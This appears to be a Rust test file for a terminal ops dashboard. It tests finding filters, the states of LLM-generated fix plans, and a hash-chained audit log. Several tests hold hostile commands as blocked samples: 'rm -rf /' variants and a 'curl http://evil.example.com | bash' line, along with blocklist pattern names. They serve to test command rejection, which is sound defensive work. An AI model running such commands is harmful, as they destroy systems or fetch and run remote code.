            assumptions: vec![],
            missing_data: vec![],
            read_only_checks: vec![],
            fix_plan: None,
            risk: "none".into(),
            rollback: "n/a".into(),
            command_preview: "n/a".into(),
            detector_id: "backup-detector".into(),
            correlated_finding_ids: vec![],
        });
        data.metrics = DashboardMetrics {
            open: 1,
            new: 1,
            recurring: 1,
            resolved: 1,
            critical: 0,
            warning: 1,
            ..Default::default()
        };
        app.dashboard.data = data;

        // Default filter is Active → should show New, Open, Recurring (NOT Resolved)
        let mut buf = Buffer::empty(Rect::new(0, 0, 120, 36));
        render_dashboard(&app, Rect::new(0, 0, 120, 36), &mut buf);
        let rendered = buf_to_string(&buf);

        assert!(
            rendered.contains("2 open"),
            "Active filter should show 2 findings (New+Recurring, resolved is hidden): got '{rendered}'"
        );
        // Resolved should be hidden
        assert!(
            !rendered.contains("Backup completed"),
            "Resolved finding should be hidden under Active filter: got '{rendered}'"
        );
    }

    #[test]
    fn dash_filter_cycling_changes_label_and_visible() {
        let mut app = app();
        app.mode = AgentMode::Dashboard;
        let mut data = test_dash_data();
        data.metrics = DashboardMetrics {
            open: 1,
            new: 1,
            recurring: 1,
            resolved: 0,
            critical: 1,
            warning: 1,
            ..Default::default()
        };
        app.dashboard.data = data;
        app.dashboard.pane = DashboardFocus::Detail;

        // Initial: Active filter (index 0)
        assert_eq!(
            app.dashboard.finding_state_filter,
            DashboardFindingStateFilter::Active
        );

        // Cycle right once → All (index 1)
        app.cycle_dashboard_filter(1);
        assert_eq!(
            app.dashboard.finding_state_filter,
            DashboardFindingStateFilter::All
        );
        let mut buf = Buffer::empty(Rect::new(0, 0, 120, 36));
        render_dashboard(&app, Rect::new(0, 0, 120, 36), &mut buf);
        let rendered = buf_to_string(&buf);
        assert!(
            rendered.contains("2 open"),
            "All filter should show all 2 findings: got '{rendered}'"
        );

        // Cycle right again → NewOnly (index 2)
        app.cycle_dashboard_filter(1);
        assert_eq!(
            app.dashboard.finding_state_filter,
            DashboardFindingStateFilter::NewOnly
        );
        let mut buf = Buffer::empty(Rect::new(0, 0, 120, 36));
        render_dashboard(&app, Rect::new(0, 0, 120, 36), &mut buf);
        let rendered = buf_to_string(&buf);
        assert!(
            rendered.contains("1 open"),
            "NewOnly filter should show 1 finding"
        );

        // Cycle right → OpenOnly (index 3)
        app.cycle_dashboard_filter(1);
        assert_eq!(
            app.dashboard.finding_state_filter,
            DashboardFindingStateFilter::OpenOnly
        );

        // Cycle right → RecurringOnly (index 4)
        app.cycle_dashboard_filter(1);
        assert_eq!(
            app.dashboard.finding_state_filter,
            DashboardFindingStateFilter::RecurringOnly
        );

        // Cycle left back to OpenOnly (index 3)
        app.cycle_dashboard_filter(-1);
        assert_eq!(
            app.dashboard.finding_state_filter,
            DashboardFindingStateFilter::OpenOnly
        );

        // Cycle left to NewOnly (index 2)
        app.cycle_dashboard_filter(-1);
        assert_eq!(
            app.dashboard.finding_state_filter,
            DashboardFindingStateFilter::NewOnly
        );

        // Cycle left to All (index 1)
        app.cycle_dashboard_filter(-1);
        assert_eq!(
            app.dashboard.finding_state_filter,
            DashboardFindingStateFilter::All
        );

        // Cycle left to Active (index 0)
        app.cycle_dashboard_filter(-1);
        assert_eq!(
            app.dashboard.finding_state_filter,
            DashboardFindingStateFilter::Active
        );

        // Clamping at left boundary: Active at index 0, left should stay at Active
        app.cycle_dashboard_filter(-1);
        assert_eq!(
            app.dashboard.finding_state_filter,
            DashboardFindingStateFilter::Active,
            "left from Active should stay at Active (saturating_sub)"
        );

        // Cycle all the way right to ResolvedOnly (last filter, index 6)
        for _ in 0..6 {
            app.cycle_dashboard_filter(1);
        }
        assert_eq!(
            app.dashboard.finding_state_filter,
            DashboardFindingStateFilter::ResolvedOnly
        );
        let mut buf = Buffer::empty(Rect::new(0, 0, 120, 36));
        render_dashboard(&app, Rect::new(0, 0, 120, 36), &mut buf);
        let rendered = buf_to_string(&buf);
        assert!(
            rendered.contains("No active findings"),
            "ResolvedOnly filter should show empty state when nothing is resolved: got '{rendered}'"
        );

        // Clamping at right boundary: ResolvedOnly at index 6, right should stay
        app.cycle_dashboard_filter(1);
        assert_eq!(
            app.dashboard.finding_state_filter,
            DashboardFindingStateFilter::ResolvedOnly,
            "right from ResolvedOnly should stay at ResolvedOnly (clamped)"
        );
    }

    #[test]
    fn dash_detail_empty_correlation_shows_no_message() {
        let mut app = app();
        app.mode = AgentMode::Dashboard;
        let mut data = test_dash_data();
        // Finding with NO correlations
        data.findings = vec![FindingSummary {
            id: "finding-solo".into(),
            fingerprint: "fp-solo".into(),
            severity: "warning".into(),
            confidence: "medium".into(),
            title: "Standalone issue".into(),
            affected_resource: "standalone".into(),
            snapshot_id: "snap-001".into(),
            domain: "network".into(),
            kind: "Network".into(),
            host: "testbox".into(),
            status: DashboardFindingState::New,
            occurrence_count: 1,
            first_seen: Utc::now().timestamp() - 600,
            last_seen: Utc::now().timestamp() - 100,
            age_label: "10m ago".into(),
            sample: "standalone".into(),
            state_note: String::new(),
            evidence_text: "no related findings".into(),
            evidence_sources: vec!["network.status".into()],
            impact: "none".into(),
            assumptions: vec![],
            missing_data: vec![],
            read_only_checks: vec![],
            fix_plan: None,
            risk: "low".into(),
            rollback: "n/a".into(),
            command_preview: "n/a".into(),
            detector_id: "network-detector".into(),
            correlated_finding_ids: vec![],
        }];
        app.dashboard.data = data;
        app.dashboard.view = DashboardView::FindingDetail(0);
        let mut buf = Buffer::empty(Rect::new(0, 0, 100, 50));
        render_dashboard(&app, Rect::new(0, 0, 100, 50), &mut buf);
        let rendered = buf_to_string(&buf);

        assert!(
            rendered.contains("WHY IT HAPPENED"),
            "detail should still show WHY section: got '{rendered}'"
        );
        assert!(
            rendered.contains("no related findings"),
            "WHY section should fall back to evidence text: got '{rendered}'"
        );
    }

    #[test]
    fn dash_llm_loading_shows_spinner() {
        let mut app = app();
        app.mode = AgentMode::Dashboard;
        app.dashboard.data = test_dash_data();
        app.dashboard.selected_fingerprint = Some("fp-001".into());
        app.dashboard.active_plan = Some(DashboardPlan {
            finding_id: "finding-001".into(),
            plan_id: "plan-test".into(),
            status: PlanStatus::Loading {
                started_at: Utc::now().timestamp(),
            },
            read_only_steps: 0,
            fix_steps: 0,
            rate_limit_retry_at: None,
            rate_limit_retry_pending: false,
        });
        app.dashboard.view = DashboardView::TroubleshootPlan(0);
        let mut buf = Buffer::empty(Rect::new(0, 0, 100, 30));
        render_dashboard(&app, Rect::new(0, 0, 100, 30), &mut buf);
        let rendered = buf_to_string(&buf);
        assert!(
            rendered.contains("Generating narrative"),
            "Loading state should show spinner text: got '{rendered}'"
        );
    }

    #[test]
    fn dash_llm_narrative_rendered() {
        let mut app = app();
        app.mode = AgentMode::Dashboard;
        app.dashboard.data = test_dash_data();
        app.dashboard.selected_fingerprint = Some("fp-001".into());
        app.dashboard.active_plan = Some(DashboardPlan {
            finding_id: "finding-001".into(),
            plan_id: "plan-test".into(),
            status: PlanStatus::Ready {
                narrative: "Disk is filling up due to log growth.".into(),
                fix_steps: vec![ValidatedFixStep {
                    command: "du -sh /var/log/*".into(),
                    purpose: "Identify large log directories".into(),
                    risk: "none".into(),
                    rollback: "no rollback needed".into(),
                    binary_warnings: vec![],
                }],
            },
            read_only_steps: 0,
            fix_steps: 0,
            rate_limit_retry_at: None,
            rate_limit_retry_pending: false,
        });
        app.dashboard.view = DashboardView::TroubleshootPlan(0);
        let mut buf = Buffer::empty(Rect::new(0, 0, 100, 40));
        render_dashboard(&app, Rect::new(0, 0, 100, 40), &mut buf);
        let rendered = buf_to_string(&buf);
        assert!(
            rendered.contains("WHY IT HAPPENED"),
            "Ready state should show WHY IT HAPPENED: got '{rendered}'"
        );
        assert!(
            rendered.contains("Disk is filling up"),
            "Ready state should render narrative: got '{rendered}'"
        );
        assert!(
            rendered.contains("du -sh /var/log/*"),
            "Ready state should show command: got '{rendered}'"
        );
    }

    #[test]
    fn dash_llm_timeout_shows_retry() {
        let mut app = app();
        app.mode = AgentMode::Dashboard;
        app.dashboard.data = test_dash_data();
        app.dashboard.selected_fingerprint = Some("fp-001".into());
        app.dashboard.active_plan = Some(DashboardPlan {
            finding_id: "finding-001".into(),
            plan_id: "plan-test".into(),
            status: PlanStatus::Timeout,
            read_only_steps: 0,
            fix_steps: 0,
            rate_limit_retry_at: None,
            rate_limit_retry_pending: false,
        });
        app.dashboard.view = DashboardView::TroubleshootPlan(0);
        let mut buf = Buffer::empty(Rect::new(0, 0, 100, 30));
        render_dashboard(&app, Rect::new(0, 0, 100, 30), &mut buf);
        let rendered = buf_to_string(&buf);
        assert!(
            rendered.contains("timed out"),
            "Timeout should show timeout message: got '{rendered}'"
        );
        assert!(
            rendered.contains("Alt+G to retry"),
            "Timeout should show retry instruction: got '{rendered}'"
        );
    }

    #[test]
    fn dash_llm_blocked_command_shows_rejected() {
        let mut app = app();
        app.mode = AgentMode::Dashboard;
        app.dashboard.data = test_dash_data();
        app.dashboard.selected_fingerprint = Some("fp-001".into());
        app.dashboard.active_plan = Some(DashboardPlan {
            finding_id: "finding-001".into(),
            plan_id: "plan-test".into(),
            status: PlanStatus::DangerousCommand {
                pattern: "rm -rf /".into(),
                command_text: "rm -rf / --no-preserve-root".into(),
            },
            read_only_steps: 0,
            fix_steps: 0,
            rate_limit_retry_at: None,
            rate_limit_retry_pending: false,
        });
        app.dashboard.view = DashboardView::TroubleshootPlan(0);
        let mut buf = Buffer::empty(Rect::new(0, 0, 100, 30));
        render_dashboard(&app, Rect::new(0, 0, 100, 30), &mut buf);
        let rendered = buf_to_string(&buf);
        assert!(
            rendered.contains("Command rejected"),
            "DangerousCommand should show rejection: got '{rendered}'"
        );
        assert!(
            rendered.contains("rm -rf /"),
            "DangerousCommand should show pattern: got '{rendered}'"
        );
        assert!(
            rendered.contains("Manual review required"),
            "DangerousCommand should mention manual review: got '{rendered}'"
        );
    }

    #[test]
    fn dash_llm_auth_failure_shows_config_fix() {
        let mut app = app();
        app.mode = AgentMode::Dashboard;
        app.dashboard.data = test_dash_data();
        app.dashboard.selected_fingerprint = Some("fp-001".into());
        app.dashboard.active_plan = Some(DashboardPlan {
            finding_id: "finding-001".into(),
            plan_id: "plan-test".into(),
            status: PlanStatus::AuthFailed,
            read_only_steps: 0,
            fix_steps: 0,
            rate_limit_retry_at: None,
            rate_limit_retry_pending: false,
        });
        app.dashboard.view = DashboardView::TroubleshootPlan(0);
        let mut buf = Buffer::empty(Rect::new(0, 0, 100, 30));
        render_dashboard(&app, Rect::new(0, 0, 100, 30), &mut buf);
        let rendered = buf_to_string(&buf);
        assert!(
            rendered.contains("authentication failed"),
            "AuthFailed should show auth message: got '{rendered}'"
        );
        assert!(
            rendered.contains("helmops init"),
            "AuthFailed should suggest reconfigure: got '{rendered}'"
        );
    }

    #[test]
    fn dash_ui_responsive_during_llm() {
        let mut app = app();
        app.mode = AgentMode::Dashboard;
        app.dashboard.data = test_dash_data();
        app.dashboard.selected_fingerprint = Some("fp-001".into());
        let (_tx, rx) = tokio::sync::oneshot::channel::<PlanStatus>();
        app.dashboard.pending_plan_rx = Some(rx);
        // Switch tab while LLM is pending — should not panic or hang.
        app.dashboard.active_tab = OpsTab::Services;
        app.dashboard.view = DashboardView::TroubleshootPlan(0);
        let mut buf = Buffer::empty(Rect::new(0, 0, 100, 30));
        render_dashboard(&app, Rect::new(0, 0, 100, 30), &mut buf);
        let rendered = buf_to_string(&buf);
        assert!(
            rendered.contains("SERVICES") || rendered.contains("services"),
            "Tab switching should work while LLM pending: got '{rendered}'"
        );
    }

    #[test]
    fn apply_modal_transitions_to_done_after_background_result() {
        let mut app = app();
        let (result_tx, result_rx) = tokio::sync::oneshot::channel();
        result_tx
            .send(Ok("Plan executed. Change set: cs-123 (applied)".to_owned()))
            .unwrap();
        app.pending_apply_rx = Some(result_rx);
        app.modal = Some(ModalState::PlanExecution {
            plan_id: "plan-123".into(),
            plan_title: "Restart service".into(),
            step_index: 1,
            step_count: 1,
            step_previews: vec!["systemctl restart demo".into()],
            step_effects: vec!["service returns healthy".into()],
            step_tools: vec!["shell".into()],
            step_risks: vec!["medium".into()],
            phase: PlanExecPhase::Running,
            result_summary: String::new(),
        });

        let runtime = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .unwrap();
        let (tx, _rx) = mpsc::unbounded_channel();
        runtime
            .block_on(app.handle_ui_event(UiEvent::Tick, tx))
            .unwrap();

        match app.modal {
            Some(ModalState::PlanExecution {
                phase,
                result_summary,
                ..
            }) => {
                assert_eq!(phase, PlanExecPhase::Done);
                assert!(result_summary.contains("Change set: cs-123"));
            }
            other => panic!("expected completed plan modal, got {other:?}"),
        }
        assert!(app.pending_apply_rx.is_none());
    }

    // ── T04: audit + plan_rejected tag ─────────────────────────────────

    #[test]
    fn dash_blocked_command_audit_entry_created() {
        let dir = tempfile::tempdir().unwrap();
        let app = app_in_dir(&dir, crate::ProviderChoice::Ollama);
        let _guard = env_lock().lock().unwrap();

        // Write an audit entry for a blocked command.
        app.write_dashboard_audit("rm -rf / --no-preserve-root", "destructive_rm_rf")
            .unwrap();

        // Query the audit_events table.
        let db = dir.path().join("helm.db");
        let conn = rusqlite::Connection::open(&db).unwrap();
        let mut stmt = conn
            .prepare("SELECT tool_name, decision, input_hash, output_hash FROM audit_events")
            .unwrap();
        let rows: Vec<(String, String, String, String)> = stmt
            .query_map([], |row| {
                Ok((
                    row.get::<_, String>(0)?,
                    row.get::<_, String>(1)?,
                    row.get::<_, String>(2)?,
                    row.get::<_, String>(3)?,
                ))
            })
            .unwrap()
            .filter_map(|r| r.ok())
            .collect();

        assert_eq!(rows.len(), 1, "expected exactly one audit event");
        let (tool_name, decision, input_hash, output_hash) = &rows[0];
        assert_eq!(tool_name, "plan-blocked");
        assert_eq!(decision, "BLOCKED:destructive_rm_rf");
        // input_hash must be SHA-256 of the command text, not the raw text.
        let expected_hash = helm_memory::stable_hash_hex("rm -rf / --no-preserve-root");
        assert_eq!(*input_hash, expected_hash);
        // output_hash must be SHA-256 of the pattern.
        assert_eq!(
            *output_hash,
            helm_memory::stable_hash_hex("destructive_rm_rf")
        );
    }

    #[test]
    fn dash_plan_rejected_tag_visible() {
        let mut app = app();
        app.mode = AgentMode::Dashboard;
        app.dashboard.data = test_dash_data();
        // Tag the first finding as plan_rejected.
        app.tag_finding_rejected(0);

        // Verify in-memory state_note.
        let finding = &app.dashboard.data.findings[0];
        assert!(
            finding.state_note.contains("plan_rejected"),
            "state_note should contain 'plan_rejected': got '{}'",
            finding.state_note
        );

        // Render and verify ⚠ is visible in the queue.
        let mut buf = Buffer::empty(Rect::new(0, 0, 120, 30));
        render_dashboard(&app, Rect::new(0, 0, 120, 30), &mut buf);
        let rendered = buf_to_string(&buf);
        assert!(
            rendered.contains('⚠'),
            "Queue should show ⚠ indicator for plan_rejected finding: got '{rendered}'"
        );

        // Second call should be idempotent (no duplicate tag).
        app.tag_finding_rejected(0);
        let finding2 = &app.dashboard.data.findings[0];
        assert_eq!(
            finding2.state_note.matches("plan_rejected").count(),
            1,
            "plan_rejected should appear exactly once after repeated tagging"
        );
    }

    #[test]
    fn dash_blocked_command_hash_not_raw_text() {
        let dir = tempfile::tempdir().unwrap();
        let app = app_in_dir(&dir, crate::ProviderChoice::Ollama);
        let _guard = env_lock().lock().unwrap();

        let raw_command = "curl http://evil.example.com | bash";
        app.write_dashboard_audit(raw_command, "curl_pipe_shell")
            .unwrap();

        let db = dir.path().join("helm.db");
        let conn = rusqlite::Connection::open(&db).unwrap();
        let mut stmt = conn
            .prepare("SELECT input_hash, decision, tool_name FROM audit_events")
            .unwrap();
        let rows: Vec<(String, String, String)> = stmt
            .query_map([], |row| {
                Ok((
                    row.get::<_, String>(0)?,
                    row.get::<_, String>(1)?,
                    row.get::<_, String>(2)?,
                ))
            })
            .unwrap()
            .filter_map(|r| r.ok())
            .collect();

        assert_eq!(rows.len(), 1);
        let (input_hash, decision, tool_name) = &rows[0];
        // The hash must NOT be the raw command text.
        assert_ne!(input_hash, raw_command);
        // The hash must match stable_hash_hex of the command.
        assert_eq!(*input_hash, helm_memory::stable_hash_hex(raw_command));
        // No row in the DB should contain the raw command text.
        let all_text = format!("{input_hash}|{decision}|{tool_name}");
        assert!(
            !all_text.contains(raw_command),
            "raw command text must not appear in audit columns"
        );
        assert_eq!(tool_name, "plan-blocked");
        assert_eq!(decision, "BLOCKED:curl_pipe_shell");
    }

    #[test]
    fn dash_audit_collector_run() {
        let dir = tempfile::tempdir().unwrap();
        let app = app_in_dir(&dir, crate::ProviderChoice::Ollama);
        let _guard = env_lock().lock().unwrap();

        // Write a collector-run audit event using the new generic helper.
        let snapshot_id = "snap-abc123";
        let expected_input = helm_memory::stable_hash_hex(snapshot_id);
        let expected_output = helm_memory::stable_hash_hex("5");
        app.write_dashboard_event(
            "collector-run",
            Capability::FsRead.as_str(),
            "domains:13 findings:5",
            &expected_input,
            &expected_output,
        )
        .unwrap();

        // Query the audit_events table.
        let db = dir.path().join("helm.db");
        let conn = rusqlite::Connection::open(&db).unwrap();
        let mut stmt = conn
            .prepare("SELECT tool_name, capability, decision, input_hash, output_hash, taint, cwd, target FROM audit_events")
            .unwrap();
        let rows: Vec<AuditRow> = stmt
            .query_map([], |row| {
                Ok((
                    row.get::<_, String>(0)?,
                    row.get::<_, String>(1)?,
                    row.get::<_, String>(2)?,
                    row.get::<_, String>(3)?,
                    row.get::<_, String>(4)?,
                    row.get::<_, String>(5)?,
                    row.get::<_, String>(6)?,
                    row.get::<_, String>(7)?,
                ))
            })
            .unwrap()
            .filter_map(|r| r.ok())
            .collect();

        assert_eq!(rows.len(), 1, "expected exactly one audit event");
        let (tool_name, capability, decision, input_hash, output_hash, taint, cwd, target) =
            &rows[0];
        assert_eq!(tool_name, "collector-run");
        assert_eq!(capability, Capability::FsRead.as_str());
        assert_eq!(decision, "domains:13 findings:5");
        assert_eq!(*input_hash, expected_input);
        assert_eq!(*output_hash, expected_output);
        assert_eq!(taint, "clean");
        assert_eq!(cwd, "");
        assert_eq!(target, "tui");
    }

    #[test]
    fn dash_audit_state_transition_user() {
        let dir = tempfile::tempdir().unwrap();
        let app = app_in_dir(&dir, crate::ProviderChoice::Ollama);
        let _guard = env_lock().lock().unwrap();

        let fingerprint = "fp-deadbeef";
        let snapshot_id = "snap-abc123";
        let finding_id = "find-01";
        let expected_input = helm_memory::stable_hash_hex(fingerprint);
        let expected_output =
            helm_memory::stable_hash_hex(&format!("{}:{}", snapshot_id, finding_id));

        // Test all three decision values.
        for decision in &["suppressed", "resolved", "reopened"] {
            app.write_dashboard_event(
                "finding-state",
                Capability::FsRead.as_str(),
                decision,
                &expected_input,
                &expected_output,
            )
            .unwrap();
        }

        // Query the audit_events table.
        let db = dir.path().join("helm.db");
        let conn = rusqlite::Connection::open(&db).unwrap();
        let mut stmt = conn
            .prepare("SELECT tool_name, capability, decision, input_hash, output_hash, taint, cwd, target FROM audit_events ORDER BY id")
            .unwrap();
        let rows: Vec<AuditRow> = stmt
            .query_map([], |row| {
                Ok((
                    row.get::<_, String>(0)?,
                    row.get::<_, String>(1)?,
                    row.get::<_, String>(2)?,
                    row.get::<_, String>(3)?,
                    row.get::<_, String>(4)?,
                    row.get::<_, String>(5)?,
                    row.get::<_, String>(6)?,
                    row.get::<_, String>(7)?,
                ))
            })
            .unwrap()
            .filter_map(|r| r.ok())
            .collect();

        assert_eq!(rows.len(), 3, "expected exactly three audit events");
        let expected_decisions = ["suppressed", "resolved", "reopened"];
        for (i, row) in rows.iter().enumerate() {
            let (tool_name, capability, decision, input_hash, output_hash, taint, cwd, target) =
                row;
            assert_eq!(tool_name, "finding-state");
            assert_eq!(capability, Capability::FsRead.as_str());
            assert_eq!(decision, expected_decisions[i]);
            assert_eq!(*input_hash, expected_input);
            assert_eq!(*output_hash, expected_output);
            assert_eq!(taint, "clean");
            assert_eq!(cwd, "");
            assert_eq!(target, "tui");
        }
    }

    #[test]
    fn dash_audit_state_transition_auto() {
        let dir = tempfile::tempdir().unwrap();
        let app = app_in_dir(&dir, crate::ProviderChoice::Ollama);
        let _guard = env_lock().lock().unwrap();

        let fingerprint_a = "fp-new-finding";
        let fingerprint_b = "fp-recurring-finding";
        let snapshot_id = "snap-abc123";
        let finding_id_a = "find-new";
        let finding_id_b = "find-recur";

        // Test "new" decision for a new finding.
        {
            let expected_input = helm_memory::stable_hash_hex(fingerprint_a);
            let expected_output =
                helm_memory::stable_hash_hex(&format!("{}:{}", snapshot_id, finding_id_a));
            app.write_dashboard_event(
                "finding-state",
                Capability::FsRead.as_str(),
                "new",
                &expected_input,
                &expected_output,
            )
            .unwrap();
        }

        // Test "recurring" decision for a recurring finding.
        {
            let expected_input = helm_memory::stable_hash_hex(fingerprint_b);
            let expected_output =
                helm_memory::stable_hash_hex(&format!("{}:{}", snapshot_id, finding_id_b));
            app.write_dashboard_event(
                "finding-state",
                Capability::FsRead.as_str(),
                "recurring",
                &expected_input,
                &expected_output,
            )
            .unwrap();
        }

        // Query the audit_events table.
        let db = dir.path().join("helm.db");
        let conn = rusqlite::Connection::open(&db).unwrap();
        let mut stmt = conn
            .prepare("SELECT tool_name, capability, decision, input_hash, output_hash, taint, cwd, target FROM audit_events ORDER BY id")
            .unwrap();
        let rows: Vec<AuditRow> = stmt
            .query_map([], |row| {
                Ok((
                    row.get::<_, String>(0)?,
                    row.get::<_, String>(1)?,
                    row.get::<_, String>(2)?,
                    row.get::<_, String>(3)?,
                    row.get::<_, String>(4)?,
                    row.get::<_, String>(5)?,
                    row.get::<_, String>(6)?,
                    row.get::<_, String>(7)?,
                ))
            })
            .unwrap()
            .filter_map(|r| r.ok())
            .collect();

        assert_eq!(rows.len(), 2, "expected exactly two audit events");
        let expected_decisions = ["new", "recurring"];
        let expected_inputs = [
            helm_memory::stable_hash_hex(fingerprint_a),
            helm_memory::stable_hash_hex(fingerprint_b),
        ];
        let expected_outputs = [
            helm_memory::stable_hash_hex(&format!("{}:{}", snapshot_id, finding_id_a)),
            helm_memory::stable_hash_hex(&format!("{}:{}", snapshot_id, finding_id_b)),
        ];
        for (i, row) in rows.iter().enumerate() {
            let (tool_name, capability, decision, input_hash, output_hash, taint, cwd, target) =
                row;
            assert_eq!(tool_name, "finding-state");
            assert_eq!(capability, Capability::FsRead.as_str());
            assert_eq!(decision, expected_decisions[i]);
            assert_eq!(*input_hash, expected_inputs[i]);
            assert_eq!(*output_hash, expected_outputs[i]);
            assert_eq!(taint, "clean");
            assert_eq!(cwd, "");
            assert_eq!(target, "tui");
        }
    }

    #[test]
    fn dash_changes_source_markers() {
        let mut app = app();
        app.mode = AgentMode::Dashboard;
        let mut data = test_dash_data();

        data.audit_events = vec![
            DashboardAuditRow {
                time: "14:30:01".into(),
                capability: Capability::FsRead.as_str().into(),
                command: "collector-run".into(),
                decision: "domains:13 findings:5".into(),
            },
            DashboardAuditRow {
                time: "14:30:02".into(),
                capability: "plan-exec".into(),
                command: "shell".into(),
                decision: "blocked".into(),
            },
        ];
        app.dashboard.data = data;
        app.dashboard.active_tab = OpsTab::Changes;

        // Render at a width that gives enough room for the kind column.
        let mut buf = Buffer::empty(Rect::new(0, 0, 120, 24));
        render_dashboard(&app, Rect::new(0, 0, 120, 24), &mut buf);
        let rendered = buf_to_string(&buf);

        assert!(
            rendered.contains("AUDIT LOG"),
            "header should include audit title"
        );
        assert!(
            rendered.contains("collector-run"),
            "collector-run row should be visible: output was:\n{rendered}"
        );
        assert!(
            rendered.contains("shell"),
            "shell row should be visible: output was:\n{rendered}"
        );
    }

    /// Integration test: write one of each of the four audit action types
    /// (auto: collector-run, auto: finding-state; user: plan-blocked, user:
    /// apply-plan approved) and verify that the full HMAC chain is clean.
    #[test]
    fn dash_audit_chain_verify_all_action_types() {
        let dir = tempfile::tempdir().unwrap();
        let db = dir.path().join("helm.db");
        let app = app_in_dir(&dir, crate::ProviderChoice::Ollama);
        let _guard = env_lock().lock().unwrap();

        // 1. auto: collector-run audit event.
        let snapshot_id = "snap-int-01";
        let input_cr = helm_memory::stable_hash_hex(snapshot_id);
        let output_cr = helm_memory::stable_hash_hex("7");
        app.write_dashboard_event(
            "collector-run",
            "fs.read",
            "domains:5 findings:7",
            &input_cr,
            &output_cr,
        )
        .unwrap();

        // 2. auto: finding-state user transition (suppressed).
        let fingerprint = "fp-int-deadbeef";
        let finding_id = "find-int-01";
        let input_fs = helm_memory::stable_hash_hex(fingerprint);
        let output_fs = helm_memory::stable_hash_hex(&format!("{}:{}", snapshot_id, finding_id));
        app.write_dashboard_event(
            "finding-state",
            "fs.read",
            "suppressed",
            &input_fs,
            &output_fs,
        )
        .unwrap();

        // 3. user: plan-blocked (rejected plan via blocklist).
        app.write_dashboard_audit("rm -rf /etc/passwd", "destructive_rm_rf")
            .unwrap();

        // 4. user: apply-plan approved.  write_apply_plan_audit is a static
        // method that uses default_db_path() (system DB), not the temp DB.
        // Write the event directly into the temp DB instead.
        {
            let plan_id = "plan-int-01";
            let decision = "approved";
            let conn2 = rusqlite::Connection::open(&db).unwrap();
            let prev = helm_memory::latest_audit_hash(&conn2, Some("tui"))
                .unwrap_or_else(|_| "GENESIS".to_string());
            let ts = conn2
                .query_row(
                    "SELECT MAX(timestamp) FROM audit_events WHERE target IS ?1",
                    rusqlite::params!["tui"],
                    |row| row.get::<_, Option<i64>>(0),
                )
                .ok()
                .flatten()
                .map(|value| value.saturating_add(1))
                .unwrap_or_else(|| chrono::Utc::now().timestamp_millis());
            let hash = helm_memory::audit_hash(helm_memory::AuditHashParts {
                previous_hash: &prev,
                episode_id: Some("tui-apply"),
                target: Some("tui"),
                timestamp: ts,
                tool_name: "apply-plan",
                input_hash: &helm_memory::stable_hash_hex(plan_id),
                output_hash: &helm_memory::stable_hash_hex(decision),
                capability: "shell.shell",
                taint: "clean",
                cwd: "",
                decision,
            });
            conn2
                .execute(
                    "INSERT INTO audit_events (episode_id, target, timestamp, tool_name, \
                     input_hash, output_hash, capability, taint, cwd, decision, \
                     previous_hash, event_hash) \
                     VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9, ?10, ?11, ?12)",
                    rusqlite::params![
                        "tui-apply",
                        "tui",
                        ts,
                        "apply-plan",
                        &helm_memory::stable_hash_hex(plan_id),
                        &helm_memory::stable_hash_hex(decision),
                        "shell.shell",
                        "clean",
                        "",
                        decision,
                        &prev,
                        &hash,
                    ],
                )
                .unwrap();
        }

        let rt = tokio::runtime::Runtime::new().unwrap();
        let store = rt.block_on(MemoryStore::open(&db)).unwrap();
        let verification = rt
            .block_on(store.verify_audit_chain_for_target(Some("tui")))
            .unwrap();
        assert!(
            verification.ok,
            "HMAC chain broken at event {}: {}",
            verification.failed_at.unwrap_or(-1),
            verification.reason.as_deref().unwrap_or("unknown")
        );
        assert!(
            verification.checked >= 4,
            "expected at least 4 events checked, got {}",
            verification.checked
        );
    }

    #[test]
    fn test_render_fleet_tab_snapshot() {
        // Create mock FleetHostStatus entries (3 hosts)
        let fleet_hosts = vec![
            FleetHostStatus {
                host_id: Uuid::new_v4(),
                name: "host1".to_string(),
                reachable: true,
                crit: 2,
                warn: 5,
                info: 10,
                last_refresh: Some(Instant::now()),
                error: None,
            },
            FleetHostStatus {
                host_id: Uuid::new_v4(),
                name: "host2".to_string(),
                reachable: true,
                crit: 0,
                warn: 1,
                info: 3,
                last_refresh: Some(Instant::now()),
                error: None,
            },
            FleetHostStatus {
                host_id: Uuid::new_v4(),
                name: "host3".to_string(),
                reachable: false,
                crit: 0,
                warn: 0,
                info: 0,
                last_refresh: None,
                error: Some("timeout".to_string()),
            },
        ];

        // Create test frame at 120×40
        let backend = TestBackend::new(120, 40);
        let mut terminal = ratatui::Terminal::new(backend).unwrap();
        let area = Rect {
            x: 0,
            y: 0,
            width: 120,
            height: 40,
        };

        // Create a minimal mock TuiApp for the test
        let tempdir = tempfile::TempDir::new().unwrap();
        let app = app_in_dir(&tempdir, crate::ProviderChoice::Groq);

        // Render the fleet tab with selected row = 0
        terminal
            .draw(|f| {
                let buf = f.buffer_mut();
                render_fleet_tab(&app, area, buf, &fleet_hosts, Some(0));
            })
            .unwrap();

        let buffer = terminal.backend().buffer().clone();
        let rendered_str: String = buffer
            .content()
            .iter()
            .flat_map(|cell| {
                let sym = cell.symbol();
                sym.chars().collect::<Vec<_>>()
            })
            .collect();

        // Verify key columns are present
        assert!(
            rendered_str.contains("Name"),
            "Fleet tab should contain 'Name' column header"
        );
        assert!(
            rendered_str.contains("Status"),
            "Fleet tab should contain 'Status' column header"
        );
        assert!(
            rendered_str.contains("CRIT"),
            "Fleet tab should contain 'CRIT' column header"
        );
        assert!(
            rendered_str.contains("WARN"),
            "Fleet tab should contain 'WARN' column header"
        );
        assert!(
            rendered_str.contains("INFO"),
            "Fleet tab should contain 'INFO' column header"
        );
        assert!(
            rendered_str.contains("Last"),
            "Fleet tab should contain 'Last' column header"
        );

        // Verify host names are rendered
        assert!(
            rendered_str.contains("host1"),
            "Fleet tab should contain host1 name"
        );
        assert!(
            rendered_str.contains("host2"),
            "Fleet tab should contain host2 name"
        );
        assert!(
            rendered_str.contains("host3"),
            "Fleet tab should contain host3 name"
        );

        // Verify status values
        assert!(
            rendered_str.contains("UP"),
            "Fleet tab should show UP status for reachable hosts"
        );
        assert!(
            rendered_str.contains("DOWN"),
            "Fleet tab should show DOWN status for unreachable hosts"
        );

        // Verify finding counts
        assert!(
            rendered_str.contains("2"),
            "Fleet tab should show host1 crit count"
        );
        assert!(
            rendered_str.contains("5"),
            "Fleet tab should show host1 warn count"
        );
    }
}
